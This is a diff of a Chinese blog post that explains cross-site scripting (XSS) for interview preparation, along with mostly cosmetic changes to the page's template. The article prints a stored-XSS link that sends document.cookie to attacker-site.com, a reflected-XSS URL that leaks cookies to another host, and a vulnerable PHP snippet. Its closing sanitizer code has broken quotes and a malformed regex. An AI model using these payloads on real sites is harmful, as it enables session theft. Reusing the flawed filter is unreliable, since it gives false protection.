@@ -6,18 +6,24 @@
   <title>XSS攻击相关 | 路人-戊</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="面试的时候好几次被问到，居然没有去总结一下，罪过！XSS攻击：跨站脚本攻击(Cross Site Scripting)，为了不和CSS重名，故写作XSS
-常见XSS攻击1、存储式XSS攻击a、嵌入JS脚本，实现对用户浏览器的控制攻击者在提交的数据里面插入一断JS，比如1&amp;lt;a href=# onclick=”document.location=’http://attacker-site.com">
+####常见XSS攻击
+#####1、存储式XSS攻击
+######a、嵌入JS脚本，实现对用户浏览器的控制攻击者在提交的数据里面插入一断JS，比如1&amp;lt;a href=# onclick=”document.location=’http://">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS攻击相关">
 <meta property="og:url" content="http://luren5.com/2015/08/03/XSS攻击相关/index.html">
 <meta property="og:site_name" content="路人-戊">
 <meta property="og:description" content="面试的时候好几次被问到，居然没有去总结一下，罪过！XSS攻击：跨站脚本攻击(Cross Site Scripting)，为了不和CSS重名，故写作XSS
-常见XSS攻击1、存储式XSS攻击a、嵌入JS脚本，实现对用户浏览器的控制攻击者在提交的数据里面插入一断JS，比如1&amp;lt;a href=# onclick=”document.location=’http://attacker-site.com">
+####常见XSS攻击
+#####1、存储式XSS攻击
+######a、嵌入JS脚本，实现对用户浏览器的控制攻击者在提交的数据里面插入一断JS，比如1&amp;lt;a href=# onclick=”document.location=’http://">
 <meta property="og:updated_time" content="2015-08-03T04:09:03.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS攻击相关">
 <meta name="twitter:description" content="面试的时候好几次被问到，居然没有去总结一下，罪过！XSS攻击：跨站脚本攻击(Cross Site Scripting)，为了不和CSS重名，故写作XSS
-常见XSS攻击1、存储式XSS攻击a、嵌入JS脚本，实现对用户浏览器的控制攻击者在提交的数据里面插入一断JS，比如1&amp;lt;a href=# onclick=”document.location=’http://attacker-site.com">
+####常见XSS攻击
+#####1、存储式XSS攻击
+######a、嵌入JS脚本，实现对用户浏览器的控制攻击者在提交的数据里面插入一断JS，比如1&amp;lt;a href=# onclick=”document.location=’http://">
   
   
     <link rel="icon" href="favicon.png">
@@ -26,8 +32,8 @@
   <link href='//fonts.useso.com/css?family=Open+Sans:400italic,400,600' rel='stylesheet' type='text/css'>
   <link href="//fonts.useso.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
   -->
-  <link rel="stylesheet" href="/css/style.css" type="text/css">
-  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
   
 
   
@@ -165,18 +171,20 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>面试的时候好几次被问到，居然没有去总结一下，罪过！<br>XSS攻击：跨站脚本攻击(Cross Site Scripting)，为了不和CSS重名，故写作XSS</p>
-<h4 id="常见XSS攻击">常见XSS攻击</h4><h5 id="1、存储式XSS攻击">1、存储式XSS攻击</h5><h6 id="a、嵌入JS脚本，实现对用户浏览器的控制">a、嵌入JS脚本，实现对用户浏览器的控制</h6><p>攻击者在提交的数据里面插入一断JS，比如<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">#</span> <span class="attribute">onclick</span>=<span class="value">”document.location=’http:</span>//<span class="attribute">attacker-site.com</span>/<span class="attribute">xss.php</span>?<span class="attribute">c</span>=<span class="value">’+escape(document.cookie);”</span>&gt;</span>戳我呀<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>####常见XSS攻击</p>
+<p>#####1、存储式XSS攻击</p>
+<p>######a、嵌入JS脚本，实现对用户浏览器的控制<br>攻击者在提交的数据里面插入一断JS，比如<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">”document.location</span>=<span class="string">’http://attacker-site.com/xss.php?c</span>=<span class="string">’+escape(document.cookie);”</span>&gt;</span>戳我呀<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>该数据如果不经过过滤直接保存到数据据中，再放出来的时候会被浏览器渲染，不知情的用户点击 “戳我呀” 那么立刻就会执行这段JS，上述的js会直接将用户的cookie发送给攻击者。</p>
-<h6 id="b、嵌入html标签">b、嵌入html标签</h6><p>这个最简单易见，直接把页面的结构搞乱, 或者有这么一段  <meta http-equiv="”refresh”" content="”0;”">  那页面就会不停的刷新。</p>
-<h5 id="2、非存储式XSS攻击">2、非存储式XSS攻击</h5><p>比如站点有这样的一个页面  <a href="http://www.aaa.com/index.php，" target="_blank" rel="external">http://www.aaa.com/index.php，</a> index.php里面的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">'name'</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"welcome  "</span>, <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure></p>
-<p>显然，代码里面没有对用户GET过来的数据进行过滤，此时攻击者如果伪造一个链接 如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aaa.com/index.php?name=<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="stylus">window.<span class="function"><span class="title">open</span><span class="params">(“www.b.com?param=”+document.cookie)</span></span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>######b、嵌入html标签<br>这个最简单易见，直接把页面的结构搞乱, 或者有这么一段  <meta http-equiv="”refresh”" content="”0;”">  那页面就会不停的刷新。</p>
+<p>#####2、非存储式XSS攻击<br>比如站点有这样的一个页面  <a href="http://www.aaa.com/index.php，" target="_blank" rel="external">http://www.aaa.com/index.php，</a> index.php里面的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$name = $_GET[<span class="string">'name'</span>];</div><div class="line">	<span class="keyword">echo</span> <span class="string">"welcome  "</span>, $name;</div></pre></td></tr></table></figure></p>
+<p>显然，代码里面没有对用户GET过来的数据进行过滤，此时攻击者如果伪造一个链接 如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.aaa.com/index.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">window.open(“www.b.com?param=”+document.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>并把它发给一个无辜的用户，如果此时这个用户正好是登录aaa.com 这个站点的时候，那悲剧了，它的cookie将会被攻击者盗走，自己却全然不知。</p>
-<h5 id="q:怎么防御？a:永远不要相信用户发来的数据，严格过滤">q:怎么防御？a:永远不要相信用户发来的数据，严格过滤</h5><p>附上一段代码，以后作为参考！<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean_xss</span><span class="params">(&amp;<span class="variable">$string</span>, <span class="variable">$low</span> = False)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! is_array ( <span class="variable">$string</span> )) &#123;</span><br><span class="line"><span class="variable">$string</span> = trim ( <span class="variable">$string</span> );</span><br><span class="line"><span class="variable">$string</span> = strip_tags ( <span class="variable">$string</span> );</span><br><span class="line"><span class="variable">$string</span> = htmlspecialchars ( <span class="variable">$string</span> );</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$low</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$string</span> = str_replace ( <span class="keyword">array</span> (‘”‘, “\”, “‘”, “/”, “..”, “../”, “./”, “<span class="comment">//” ), ”, $string );</span></span><br><span class="line"><span class="variable">$no</span> = ‘/%<span class="number">0</span>[<span class="number">0</span>-<span class="number">8</span>bcef]/’;</span><br><span class="line"><span class="variable">$string</span> = preg_replace ( <span class="variable">$no</span>, ”, <span class="variable">$string</span> );</span><br><span class="line"><span class="variable">$no</span> = ‘/%<span class="number">1</span>[<span class="number">0</span>-<span class="number">9</span>a-f]/’;</span><br><span class="line"><span class="variable">$string</span> = preg_replace ( <span class="variable">$no</span>, ”, <span class="variable">$string</span> );</span><br><span class="line"><span class="variable">$no</span> = ‘/[x00-x08x0Bx0Cx0E-x1Fx7F]+/S’;</span><br><span class="line"><span class="variable">$string</span> = preg_replace ( <span class="variable">$no</span>, ”, <span class="variable">$string</span> );</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$keys</span> = array_keys ( <span class="variable">$string</span> );</span><br><span class="line"><span class="keyword">foreach</span> ( <span class="variable">$keys</span> <span class="keyword">as</span> <span class="variable">$key</span> ) &#123;</span><br><span class="line">clean_xss ( <span class="variable">$string</span> [<span class="variable">$key</span>] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//just a test</span></span><br><span class="line"><span class="variable">$str</span> = ‘phpddt.com&lt;meta http-equiv=”refresh” content=”<span class="number">0</span>;”&gt;’;</span><br><span class="line">clean_xss(<span class="variable">$str</span>); <span class="comment">//如果你把这个注释掉，你就知道xss攻击的厉害了</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure></p>
+<p>#####q:怎么防御？a:永远不要相信用户发来的数据，严格过滤<br>附上一段代码，以后作为参考！<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean_xss</span><span class="params">(&amp;$string, $low = False)</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (! is_array ( $string )) &#123;</div><div class="line">$string = trim ( $string );</div><div class="line">$string = strip_tags ( $string );</div><div class="line">$string = htmlspecialchars ( $string );</div><div class="line"><span class="keyword">if</span> ($low) &#123;</div><div class="line"><span class="keyword">return</span> <span class="keyword">True</span>;</div><div class="line">&#125;</div><div class="line">$string = str_replace ( <span class="keyword">array</span> (‘”‘, “\”, “‘”, “/”, “..”, “../”, “./”, “<span class="comment">//” ), ”, $string );</span></div><div class="line">$no = ‘/%<span class="number">0</span>[<span class="number">0</span><span class="number">-8</span>bcef]/’;</div><div class="line">$string = preg_replace ( $no, ”, $string );</div><div class="line">$no = ‘/%<span class="number">1</span>[<span class="number">0</span><span class="number">-9</span>a-f]/’;</div><div class="line">$string = preg_replace ( $no, ”, $string );</div><div class="line">$no = ‘/[x00-x08x0Bx0Cx0E-x1Fx7F]+/S’;</div><div class="line">$string = preg_replace ( $no, ”, $string );</div><div class="line"><span class="keyword">return</span> <span class="keyword">True</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line">$keys = array_keys ( $string );</div><div class="line"><span class="keyword">foreach</span> ( $keys <span class="keyword">as</span> $key ) &#123;</div><div class="line">clean_xss ( $string [$key] );</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="comment">//just a test</span></div><div class="line">$str = ‘phpddt.com&lt;meta http-equiv=”refresh” content=”<span class="number">0</span>;”&gt;’;</div><div class="line">clean_xss($str); <span class="comment">//如果你把这个注释掉，你就知道xss攻击的厉害了</span></div><div class="line"><span class="keyword">echo</span> $str;</div></pre></td></tr></table></figure></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luren5.com/2015/08/03/XSS攻击相关/" data-id="civenujfz004ur6es5h6x6whq" class="article-share-link">分享到</a>
+      <a data-url="http://luren5.com/2015/08/03/XSS攻击相关/" data-id="civrvwf88000mvkesv2h8wg5i" class="article-share-link">分享到</a>
       
         <a href="http://luren5.com/2015/08/03/XSS攻击相关/#ds-thread" class="article-comment-link">评论</a>
       
@@ -326,7 +334,7 @@
   
   <div class="outer">
     <div id="footer-info" class="inner">
-      &copy; Tue Jul 28 2015 08:00:00 GMT+0800 (CST) - 2016 路人-戊<br>
+      &copy; 2015-7-28 - 2016 路人-戊<br>
       Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
 <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1255960260'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1255960260%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
 
@@ -354,11 +362,11 @@
 <script src="http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
 
 
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
-  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
 
 
-<script src="/js/script.js" type="text/javascript"></script>
+<script src="/js/script.js"></script>
 
   </div>
 </body>
